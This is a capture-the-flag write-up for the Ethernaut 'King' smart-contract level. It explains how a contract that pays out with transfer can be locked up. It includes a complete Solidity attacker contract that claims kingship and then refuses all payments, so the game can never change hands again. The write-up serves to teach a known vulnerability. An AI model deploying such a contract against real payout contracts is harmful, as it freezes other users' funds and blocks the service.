# 09. King
<sup>Difficulty 6/10</sup>

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

## Solution

We need to break the game and be the one and only king forever.

The fallback function is the one delegated to update the king, how to break it?

```solidity
receive() external payable {
	require(msg.value >= prize || msg.sender == owner);
	king.transfer(msg.value);
	king = msg.sender;
	prize = msg.value;
}
```

Funds are moved using the `transfer` function... A remembrance of a precedent challenge made me find the *purr*fect solution!

In [challenge #07.Force](./07_force.md) we needed to fund a contract without any fallback method. In that case, we couldn't use the `transfer` or `send` methods because them would systematically fail. 
We can now exploit that behavior to crown our one and only ~~Cat~~ King!

Create a simple contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract KingCat {
    address payable contractInstance = 0x03CF5Cd253B47de3a9a54234fb0e7c25E9a0e0C1;  // challenge address
    function becomeThePurrfectKing() public payable {
        (bool sent, ) = contractInstance.call.value(msg.value)("");
        require(sent, "Not so purrfect!");
    }
}
```

Then call the `becomeThePurrfectKing` sending some ETH

All hail the King Cat!


Personal note: `transfer` and `send` didn't work in this case. Use `call`.

## OZ Corner

Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

In this case, see: [King of the Ether](https://www.kingoftheether.com/thrones/kingoftheether/index.html) and [King of the Ether Postmortem](http://www.kingoftheether.com/postmortem.html).

